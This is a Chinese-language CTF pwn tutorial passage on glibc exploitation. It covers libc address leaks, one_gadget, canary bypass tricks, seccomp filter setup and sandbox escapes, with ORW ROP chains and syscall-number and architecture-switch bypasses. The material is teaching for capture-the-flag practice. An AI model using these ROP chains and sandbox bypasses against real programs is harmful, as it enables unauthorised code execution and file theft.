<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>64位</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>特别得，对于printf输出数字结果，不需要小端序转换，<code>[:-1]</code>是为了去掉最后的回车</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="获取libc基址"><a href="#获取libc基址" class="headerlink" title="获取libc基址"></a>获取libc基址</h3><ul>
<li><p>LibcSearcher</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">system_addr = libc_base + obj.dump(<span class="string">&quot;system&quot;</span>)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>ELF</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.symbol[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">ayatem_addr = libc_base + libc.symbol[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="构造rop获取shell"><a href="#构造rop获取shell" class="headerlink" title="构造rop获取shell"></a>构造rop获取shell</h3><p>  system函数调用过程。</p>
<p>  另外，可以<code>one_gadget</code>查找已知的libc中<code>exevce(&quot;/bin/sh&quot;)</code>语句的地址。</p>
  <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">one_gadget libc-2.23.so</span></span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf0274 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1117 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure></div>
<h1 id="canary-绕过"><a href="#canary-绕过" class="headerlink" title="canary 绕过"></a>canary 绕过</h1><h2 id="泄露canary"><a href="#泄露canary" class="headerlink" title="泄露canary"></a>泄露canary</h2><ul>
<li><p>利用栈溢出泄露canary<br>canary 以 <code>\x00</code> 结尾，通过栈溢出覆盖 canary 最低字节，之后输出输入内容时会连带将 canary 一同输出。</p>
</li>
<li><p>利用格式化字符串漏洞泄露 canary。</p>
<p>  由于 canary 存储在栈上，因此很容易就可以利用格式化字符串漏洞泄露。</p>
</li>
</ul>
<h2 id="逐字节爆破"><a href="#逐字节爆破" class="headerlink" title="逐字节爆破"></a>逐字节爆破</h2><p>例如下面的程序：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">	<span class="type">pid_t</span> id = fork();</span><br><span class="line">	<span class="keyword">if</span>(id &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(id) &#123;</span><br><span class="line">		<span class="built_in">wait</span>(<span class="number">0</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">vuln</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于 <strong>fork 产生的子进程的 canary 与父进程相同</strong>，因此可以根据子进程是否打印报错信息来逐字节爆破 canary 。</p>
<h2 id="劫持-stack-chk-failed-函数"><a href="#劫持-stack-chk-failed-函数" class="headerlink" title="劫持 __stack_chk_failed 函数"></a>劫持 __stack_chk_failed 函数</h2><p>canary 检测失败会调用 __stack_chk_failed 函数，可以通过比如格式化字符串漏洞修改 got 表中对应 __stack_chk_failed 的位置为后门函数的地址来实施攻击。</p>
<h2 id="利用-stack-chk-failed-函数报错信息泄露数据"><a href="#利用-stack-chk-failed-函数报错信息泄露数据" class="headerlink" title="利用 __stack_chk_failed 函数报错信息泄露数据"></a>利用 __stack_chk_failed 函数报错信息泄露数据</h2><p> __stack_chk_failed 函数输出错误信息时会把 __libc_argv[0] 作为信息输出，也就是 main 函数参数的 argv[0]，这个参数保存在栈中，如果可以覆盖该参数，也就可以打印出需要泄露的信息。</p>
<h2 id="覆盖-canary-初始值"><a href="#覆盖-canary-初始值" class="headerlink" title="覆盖 canary 初始值"></a>覆盖 canary 初始值</h2><p> linux 下 fs 寄存器指向当前栈的 TLS 结构，fs:0x28 指向的是 TLS 结构中的 stack_guard 值，如果可以覆盖位于 TLS 中的 canary 初始值就可以绕过 canary 保护。</p>
<ul>
<li>栈和 mmap 出的内存一般离 TLS 很近，可以通过溢出覆盖。</li>
<li>gdb下利用 <code>search -canary字节数 canary</code> 命令可以快速定位出 canary 的位置。</li>
</ul>
<p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/pwn_cc2c970b6ae5033b88ec97722344e326" >例题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p> 另外如果题目中申请的 chunk 大小限制不能很大，无法触发 mmap 且只能申请 1 次，那么就无法通过堆溢出修改 canary 。</p>
<p> 但是像<a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/21st_century" >这道题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>可以通过栈溢出伪造环境变量添加 <code>MALLOC_MMAP_THRESHOLD_=1</code> ，这样即使 malloc 很小的 chunk 也会触发 mmap 分配内存，因此同样可以覆盖 canary 。</p>
<h1 id="沙箱绕过"><a href="#沙箱绕过" class="headerlink" title="沙箱绕过"></a>沙箱绕过</h1><p>这里的沙箱通常指的是 seccomp 。</p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><code>PR_SET_SECCOMP</code> 是 Linux 内核提供的一种机制，用于限制进程可以执行的系统调用，从而增强系统的安全性。<code>PR_SET_SECCOMP</code> 机制可以通过使用 <code>prctl()</code> 系统调用来设置，具体来说，可以通过 <code>PR_SET_SECCOMP</code> 命令设置进程的 seccomp 过滤器，或通过 <code>PR_SET_NO_NEW_PRIVS</code> 命令设置进程的 <code>no_new_privs</code> 标志。</p>
<p>seccomp 过滤器可以通过编写 BPF（Berkeley Packet Filter）程序来实现，BPF 程序可以过滤进程所发起的系统调用，只允许特定的系统调用通过，从而限制进程的行为。seccomp 过滤器只能在进程启动时设置，并且一旦设置，就不能修改，这样可以防止攻击者通过注入代码来修改过滤器。</p>
<p><code>PR_SET_NO_NEW_PRIVS</code> 标志可以用于禁止进程获取更高的权限，即使进程拥有特权级别的用户或进程权限。这可以防止进程通过提升权限来攻击系统，从而增强系统的安全性。</p>
<p><strong>一般使用 seccomp 有两种方法，一种是用 <code>prctl</code> ，另一种是用 <code>seccomp</code> 。</strong></p>
<h3 id="使用-prctl-创建-seccomp"><a href="#使用-prctl-创建-seccomp" class="headerlink" title="使用 prctl 创建 seccomp"></a>使用 prctl 创建 seccomp</h3><p>我们可以借助工具 seccomp-tools 来编写沙箱规则。</p>
<p>首先编写沙箱规则，这里我们保存在文件 <code>rule</code> 中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">A = arch</span><br><span class="line">A == ARCH_X86_64 ? next : kill</span><br><span class="line">A = sys_number</span><br><span class="line">A &gt;= 0x40000000 ? kill : next</span><br><span class="line">A == execve ? kill : allow</span><br><span class="line">allow:</span><br><span class="line">return ALLOW</span><br><span class="line">kill:</span><br><span class="line">return KILL</span><br></pre></td></tr></table></figure></div>
<p>运行命令将沙箱规则转换为可被 <code>PR_SET_SECCOMP</code> 识别的规则。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">➜ seccomp-tools asm rule -a amd64 -f raw | seccomp-tools disasm - </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x02 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
<p>将生成的规则应用到 c 程序中，这里使用 <code>prctl</code> 系统调用来设置沙箱规则。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 定义过滤器规则</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">            &#123;<span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000004</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x15</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0xc000003e</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000000</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x35</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x40000000</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x15</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x0000003b</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7fff0000</span>&#125;,</span><br><span class="line">            &#123;<span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000000</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">            .len = (<span class="type">unsigned</span> <span class="type">short</span>) (<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">            .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置seccomp过滤器</span></span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] prctl error.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行系统调用</span></span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>编译后通过 <code>seccomp-tools dump</code> 命令可以看到程序中有了 seccomp 规则（<code>ptctl</code> 系统调用需要 root 权限因此需要加 sudo）。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">➜ sudo seccomp-tools dump ./test</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x02 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
<p>运行程序发现 <code>execve</code> 系统调用无法正常执行。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ sudo ./test    </span><br><span class="line">[1]    40123 invalid system call  sudo ./test</span><br></pre></td></tr></table></figure></div>
<h3 id="使用-seccomp-创建-seccomp"><a href="#使用-seccomp-创建-seccomp" class="headerlink" title="使用 seccomp 创建 seccomp"></a>使用 seccomp 创建 seccomp</h3><p>如果是使用 <code>seccomp</code> 系统调用添加规则，那么首先需要安装 <code>seccomp</code> 库的开发包：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libseccomp-dev</span><br></pre></td></tr></table></figure></div>
<p>前面的代码可以写作如下形式：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc test.c -o test -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个过滤器上下文</span></span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加过滤规则</span></span><br><span class="line">    seccomp_arch_add(ctx, SCMP_ARCH_X86_64);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行系统调用</span></span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中添加规则的函数 <code>seccomp_arch_add</code> 定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seccomp_rule_add</span><span class="params">(scmp_filter_ctx ctx, <span class="type">uint32_t</span> action, <span class="type">int</span> syscall, <span class="type">unsigned</span> <span class="type">int</span> arg_cnt, ...)</span>;</span><br></pre></td></tr></table></figure></div>
<p>其中参数解释如下：</p>
<ul>
<li><code>ctx</code>：过滤器上下文，用于存储过滤规则。</li>
<li><code>action</code>：当规则匹配时的操作，可以是以下值之一。<ul>
<li><code>SCMP_ACT_ALLOW</code>：允许系统调用。</li>
<li><code>SCMP_ACT_KILL</code>：杀死进程。</li>
<li><code>SCMP_ACT_ERRNO</code>：返回错误码并允许系统调用，用法为 <code>SCMP_ACT_ERRNO(返回值)</code> ，这样该系统调用如果满足条件则直接返回定义的返回值而不进行系统调用。在某些题目中通常用来劫持特定系统调用返回特殊值，比如劫持 <code>open</code> 系统调用返回 0 即标准输入。</li>
</ul>
</li>
<li><code>syscall</code>：要限制的系统调用号。</li>
<li><code>arg_cnt</code>：要匹配的参数数量，如果没有参数需要匹配，则 <code>arg_cnt</code> 应该为 0 。</li>
<li><code>...</code>：可变参数列表，用于指定要匹配的参数值。对于每个参数，需要指定一个 <code>scmp_arg_cmp</code> 结构体，这个结构体包含了参数的比较方式和比较值。<code>scmp_arg_cmp</code> 结构体定义如下：  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">scmp_arg_cmp</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> arg;	<span class="comment">/**&lt; argument number, starting at 0 */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">scmp_compare</span> <span class="title">op</span>;</span>	<span class="comment">/**&lt; the comparison op, e.g. SCMP_CMP_* */</span></span><br><span class="line">	<span class="type">scmp_datum_t</span> datum_a;</span><br><span class="line">	<span class="type">scmp_datum_t</span> datum_b;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>arg</code>：要比较的参数序号，从0开始。</li>
<li><code>op</code>：比较方式，可以是以下值之一：<ul>
<li><code>SCMP_CMP_NE</code>：不等于</li>
<li><code>SCMP_CMP_EQ</code>：等于</li>
<li><code>SCMP_CMP_LT</code>：小于</li>
<li><code>SCMP_CMP_LE</code>：小于等于</li>
<li><code>SCMP_CMP_GT</code>：大于</li>
<li><code>SCMP_CMP_GE</code>：大于等于</li>
<li><code>SCMP_CMP_MASKED_EQ</code>：按位与运算后等于（比较值为掩码）。</li>
</ul>
</li>
<li><code>datum_a</code>：用来与参数进行比较的值。</li>
</ul>
</li>
</ul>
<p>例如下面的代码添加的规则是规定 <code>read</code> 必须从标准输入读取不超过 <code>BUF_SIZE</code> 的内容到 <code>buf</code> 中。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 0x100</span></span><br><span class="line">    <span class="type">char</span> buf[BUF_SIZE];</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">3</span>,</span><br><span class="line">                     SCMP_A0(SCMP_CMP_EQ, fileno(<span class="built_in">stdin</span>)),</span><br><span class="line">                     SCMP_A1(SCMP_CMP_EQ, (<span class="type">scmp_datum_t</span>) buf),</span><br><span class="line">                     SCMP_A2(SCMP_CMP_LE, BUF_SIZE));</span><br></pre></td></tr></table></figure></div>
<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><p>一直常见的沙箱类型是禁用 <code>execve</code> 系统调用。这种类型的沙箱通常的绕过方法是劫持控制流通过 rop 或 shellcode 依次调用 <code>open</code> ，<code>read</code> ，<code>write</code> 来完成对 <code>flag</code> 文件的读取和输出。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(file_name_addr)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdx; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdx; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br></pre></td></tr></table></figure></div>
<p>32 位下由于 linux 调用约定是外平栈，因此连续函数调用需要在函数返回地址写平栈 gadget 。 </p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += p32(libc.symbols[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p32(libc.search(asm(<span class="string">&#x27;pop ebx; pop esi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p32(file_name_addr)</span><br><span class="line">rop += p32(<span class="number">0</span>)</span><br><span class="line">rop += p32(libc.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p32(libc.search(asm(<span class="string">&#x27;pop ebx; pop esi; pop edi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p32(<span class="number">3</span>)</span><br><span class="line">rop += p32(buf_addr)</span><br><span class="line">rop += p32(<span class="number">0x100</span>)</span><br><span class="line">rop += p32(libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">rop += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop += p32(buf_addr)</span><br></pre></td></tr></table></figure></div>
<h3 id="使用功能相似的系统调用替代"><a href="#使用功能相似的系统调用替代" class="headerlink" title="使用功能相似的系统调用替代"></a>使用功能相似的系统调用替代</h3><p>有的题目除了禁用 <code>execve</code> 系统调用外，还可能会禁用 <code>open</code> ，<code>read</code> ，<code>write</code> 这些系统调用。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line">0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line">0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line">0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line">0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line">0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011</span><br><span class="line">0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011</span><br><span class="line">0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011</span><br><span class="line">0008: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0011</span><br><span class="line">0009: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0011</span><br><span class="line">0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line">0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
<p>对于这种情况我们可以使用可以代替被禁用的系统调用的其他系统调用。</p>
<p>例如 <code>open</code> 的替代系统调用 <code>openat</code> 使用方法如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * #define __NR_openat 257</span></span><br><span class="line"><span class="comment"> * # define AT_FDCWD        -100</span></span><br><span class="line"><span class="comment"> * #define O_RDONLY         00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> fd = syscall(__NR_openat, AT_FDCWD, <span class="string">&quot;main.cpp&quot;</span>, O_RDONLY);</span><br></pre></td></tr></table></figure></div>

<p><strong>需要注意 <code>open</code> 函数实际上是调用了 <code>openat</code> 系统调用。</strong></p>
<h3 id="使用-4-字节系统调用号绕过"><a href="#使用-4-字节系统调用号绕过" class="headerlink" title="使用 4 字节系统调用号绕过"></a>使用 4 字节系统调用号绕过</h3><p>例如下面这种情况，虽然所有可例用的系统调用号都被禁了，但是由于没有判断 <code>sys_number &gt;= 0x40000000</code> 的情况，因此可以使用 <code>0x40000000|sys_number</code> 来绕过。这里 <code>sys_number</code> 是 64 位的系统调用号。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line">0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009</span><br><span class="line">0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line">0003: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line">0004: 0x15 0x04 0x00 0x00000009  if (A == mmap) goto 0009</span><br><span class="line">0005: 0x15 0x03 0x00 0x00000065  if (A == ptrace) goto 0009</span><br><span class="line">0006: 0x15 0x02 0x00 0x00000101  if (A == openat) goto 0009</span><br><span class="line">0007: 0x15 0x01 0x00 0x00000130  if (A == open_by_handle_at) goto 0009</span><br><span class="line">0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line">0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
<h3 id="使用-32-位-shellcode-绕过"><a href="#使用-32-位-shellcode-绕过" class="headerlink" title="使用 32 位 shellcode 绕过"></a>使用 32 位 shellcode 绕过</h3><p>例如这道<a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/27" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，该题目的沙箱规则如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">➜ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0003</span><br><span class="line"> 0002: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0007</span><br><span class="line"> 0003: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0006</span><br><span class="line"> 0005: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
<p>可以看到这个沙箱规则没有判断 <code>A != ARCH_X86_64</code> 的情况，因此可以使用如下 shellcode 切换到 32 位完成 orw 。位数切换是通过 retf 指令跨段跳转完成。</p>
